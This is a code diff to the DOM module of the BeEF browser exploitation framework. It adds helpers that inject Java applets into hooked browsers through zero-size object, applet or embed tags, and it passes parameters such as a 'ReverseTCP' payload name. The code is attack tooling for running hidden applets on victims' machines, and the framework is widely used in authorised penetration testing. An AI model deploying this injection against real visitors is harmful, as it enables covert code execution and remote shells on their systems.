@@ -16,7 +16,7 @@
 /*!
  * @literal object: beef.dom
  *
- * Provides functionalities to manipulate the DOM.
+ * Provides functionality to manipulate the DOM.
  */
 beef.dom = {
 	
@@ -191,37 +191,78 @@ beef.dom = {
 	},
 
     /**
+     *  Given an array of objects (key/value), return a string of param tags ready to append in applet/object/embed
+     * @params: {Array} an array of params for the applet, ex.: [{'argc':'5', 'arg0':'ReverseTCP'}]
+     * @return: {String} the parameters as a string ready to append to applet/embed/object tags (ex.: <param name='abc' value='test' />).
+     */
+    parseAppletParams: function(params){
+         var result = '';
+         for (i in params){
+           var param = params[i];
+           for(key in param){
+              result += "<param name='" + key + "' value='" + param[key] + "' />";
+           }
+         }
+        return result;
+    },
+
+    /**
+     * Attach an applet to the DOM, using the best approach for differet browsers (object/applet/embed).
      * @params: {String} id: reference identifier to the applet.
      * @params: {String} code: name of the class to be loaded. For example, beef.class.
      * @params: {String} archive: the jar that contains the code.
+     * @params: {String} params: an array of additional params that the applet except.
      * example usage in code:
-     * beef.dom.attachApplet('appletId', 'SuperMario3D.class', 'http://127.0.0.1:3000/ui/media/images/target.jar');
+     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D.class', 'http://127.0.0.1:3000/ui/media/images/target.jar', [{'param1':'1', 'param2':'2'}]);
      */
-    attachApplet: function(id, code, archive){
+    attachApplet: function(id, name, code, archive, params) {
         var content = null;
-        if(beef.browser.isIE()){
-           content = "" +
-               "<object id='" + id + "'classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' " +
-                    "height='0' width='0' > " +
-                        "<param name='code' value='" + code + "' />" +
-                        "<param name='archive' value='" + archive + "' />" +
-                "</object>";
-        }else{ // if the hooked browser is not IE, then use the embed tag
-             content = "" +
+        if (beef.browser.isIE()) {
+            content = "" + // the classid means 'use the latest JRE available to launch the applet'
+                "<object id='" + id + "'classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' " +
+                "height='0' width='0' name='" + name + "'> " +
+                "<param name='code' value='" + code + "' />" +
+                "<param name='archive' value='" + archive + "' />";
+
+            if (params != null) {
+                content += beef.dom.parseAppletParams(params);
+            }
+            content += "</object>";
+        }
+        if (beef.browser.isC() || beef.browser.isS() || beef.browser.isO()) {
+            content = "" +
+                "<applet id='" + id + "' code='" + code + "' " +
+                "archive='" + archive + "' " +
+                "height='0' width='0' name='" + name + "'>";
+
+            if (params != null) {
+                content += beef.dom.parseAppletParams(params);
+            }
+            content += "</applet>";
+        }
+        if (beef.browser.isFF()) {
+            content = "" +
                 "<embed id='" + id + "' code='" + code + "' " +
-                    "type='application/x-java-applet' archive='" + archive + "' " +
-                    "height='0' width='0' >" +
-                "</embed>";
+                "type='application/x-java-applet' archive='" + archive + "' " +
+                "height='0' width='0' name='" + name + "'>";
+
+            if (params != null) {
+                content += beef.dom.parseAppletParams(params);
+            }
+            content += "</embed>";
         }
         $j('body').append(content);
     },
 
     /**
+     * Given an id, remove the applet from the DOM.
      * @params: {String} id: reference identifier to the applet.
      */
     detachApplet: function(id){
        $j('#' + id + '').detach();
     }
+
+
 	
 };
 
